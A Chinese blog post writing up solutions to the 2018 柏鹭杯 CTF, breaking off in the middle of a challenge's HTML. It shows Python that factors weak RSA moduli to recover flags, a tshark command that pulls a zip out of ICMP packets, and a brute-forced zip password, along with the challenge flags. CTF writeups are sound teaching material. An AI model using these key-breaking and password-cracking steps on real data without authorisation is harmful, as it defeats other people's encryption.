<!DOCTYPE html>




<html class="theme-next gemini" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">









  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">






<meta name="description" content="CTFCryptoCrypto1problem123456789101112131415161718from flag import flagfrom Crypto.Util.number import *import randomdef next_prime(n):    num = n + 1    while True:        if isPrime(num):">
<meta property="og:type" content="article">
<meta property="og:title" content="2018 柏鹭杯 writeup">
<meta property="og:url" content="https://findneo.github.io/181125-bailucup-writeup/index.html">
<meta property="og:site_name" content="闲言语">
<meta property="og:description" content="CTFCryptoCrypto1problem123456789101112131415161718from flag import flagfrom Crypto.Util.number import *import randomdef next_prime(n):    num = n + 1    while True:        if isPrime(num):">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://findneo.github.io/181125-bailucup-writeup/1543149985751.png">
<meta property="og:image" content="https://findneo.github.io/181125-bailucup-writeup/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s">
<meta property="og:updated_time" content="2019-01-25T23:21:37.216Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2018 柏鹭杯 writeup">
<meta name="twitter:description" content="CTFCryptoCrypto1problem123456789101112131415161718from flag import flagfrom Crypto.Util.number import *import randomdef next_prime(n):    num = n + 1    while True:        if isPrime(num):">
<meta name="twitter:image" content="https://findneo.github.io/181125-bailucup-writeup/1543149985751.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://findneo.github.io/181125-bailucup-writeup/">





  <title>2018 柏鹭杯 writeup | 闲言语</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">闲言语</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/181125-bailucup-writeup/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="findneo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闲言语">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">2018 柏鹭杯 writeup</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-25T20:25:37+08:00">
                2018-11-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h3><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    num = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(num):</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">p = random.randint(<span class="number">1</span>&lt;&lt;<span class="number">3071</span>,<span class="number">1</span>&lt;&lt;<span class="number">3072</span>)</span><br><span class="line">p = next_prime(p)</span><br><span class="line">q = next_prime(p*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = pow(bytes_to_long(flag),e,N)</span><br><span class="line"><span class="keyword">print</span> N<span class="comment">#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br></pre></td></tr></table></figure>
<h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line">c=<span class="number">152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">k=gmpy2.iroot(n//<span class="number">10</span>+<span class="number">1</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">print(k)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xfffffff</span>):</span><br><span class="line">    f=k-i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10000</span>==<span class="number">0</span>:</span><br><span class="line">        print(i,end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">if</span> n%f==<span class="number">0</span>:</span><br><span class="line">        print(i,n)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p=f</span><br><span class="line">q=n//f</span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378</span></span><br><span class="line"><span class="comment"># 0 59 247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="comment"># b'ISEC&#123;simp13_crypt0&#125;'</span></span><br></pre></td></tr></table></figure>
<h3 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h3><blockquote>
<p>基因会突变，BASE64与Caesar也变异<br>加密密文: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6=<br>​    格式: ISEC{ }</p>
</blockquote>
<p>我好像不太懂╮(╯▽╰)╭</p>
<h3 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h3><h4 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RSA(<span class="number">829467319</span>, <span class="number">48357</span>)</span><br><span class="line"><span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span></span><br></pre></td></tr></table></figure>
<h4 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">829467319</span></span><br><span class="line"><span class="comment"># 使用yafu离线分解得到p,q</span></span><br><span class="line">p = <span class="number">36497</span></span><br><span class="line">q = <span class="number">22727</span></span><br><span class="line">e=<span class="number">48357</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">c=[<span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> ci:chr(pow(ci,d,n)),c))</span><br><span class="line">print(s) <span class="comment"># _stIwn_:!oAestN_rii.ra__&#125;e_gt8nuae1nolg0iYf_2w&#123;_un_CeoeeEhychST</span></span><br></pre></td></tr></table></figure>
<p><img src="1543149985751.png" alt="1543149985751"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>部分ICMP包DATA字段携带数据，且逐字节为504B…，很显然是个压缩包，使用命令行工具tshark提取对应字段。</p>
<p>tshark用法参考<code>tshark --help</code> 或 <a href="https://www.cnblogs.com/liun1994/p/6142505.html" target="_blank" rel="noopener">Wireshark命令行工具tshark使用小记</a> 。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r pcapng.pcapng  -Y <span class="string">"icmp and icmp.ident==0x930a"</span>  -T fields -e data | xxd -r -p &gt; flag.zip &amp;&amp; xxd flag.zip</span><br><span class="line">00000000: 504b 0304 1400 0100 0000 0386 584d 2a17  PK..........XM*.</span><br><span class="line">00000010: fbf2 3200 0000 2600 0000 0800 0000 666c  ..2...&amp;.......fl</span><br><span class="line">00000020: 6167 2e74 7874 c541 e340 943c a98d fc66  ag.txt.A.@.&lt;...f</span><br><span class="line">00000030: 952e 0ffe 9ff3 8797 7647 b934 6d3d 8d3d  ........vG.4m=.=</span><br><span class="line">00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f 0903  .L.-....r:.\^...</span><br><span class="line">00000050: 64ea 7b5b 1ae0 1a4c 504b 0102 3f00 1400  d.&#123;[...LPK..?...</span><br><span class="line">00000060: 0100 0000 0386 584d 2a17 fbf2 3200 0000  ......XM*...2...</span><br><span class="line">00000070: 2600 0000 0800 2400 0000 0000 0000 2000  &amp;.....$....... .</span><br><span class="line">00000080: 0000 0000 0000 666c 6167 2e74 7874 0a00  ......flag.txt..</span><br><span class="line">00000090: 2000 0000 0000 0100 1800 cee8 7c47 766b   ...........|Gvk</span><br><span class="line">000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b  ..&#125;-.Bvk..&#125;-.Bvk</span><br><span class="line">000000b0: d401 504b 0506 0000 0000 0100 0100 5a00  ..PK..........Z.</span><br><span class="line">000000c0: 0000 5800 0000 0000 0050                 ..X......P</span><br><span class="line">neo@u:/mnt/d/cwd/bailu/mis1$</span><br></pre></td></tr></table></figure>
<p>使用ziperello爆破密码为q，得到<code>flag{d27ca49cb6f5583ae9f3bb2ec38190de}</code> 。</p>
<h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><h4 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>safe box<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">input &#123;</span></span><br><span class="line"><span class="undefined">  font-size: 200%;</span></span><br><span class="line"><span class="undefined">  margin-top: 5em;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  width: 26em;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#result &#123;</span></span><br><span class="line"><span class="undefined">  margin-top: 8em;</span></span><br><span class="line"><span class="undefined">  font-size: 300%;</span></span><br><span class="line"><span class="undefined">  font-family: monospace;</span></span><br><span class="line"><span class="undefined">  font-weight: bold;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Granted";</span></span><br><span class="line"><span class="undefined">  color: green;</span></span><br><span class="line"><span 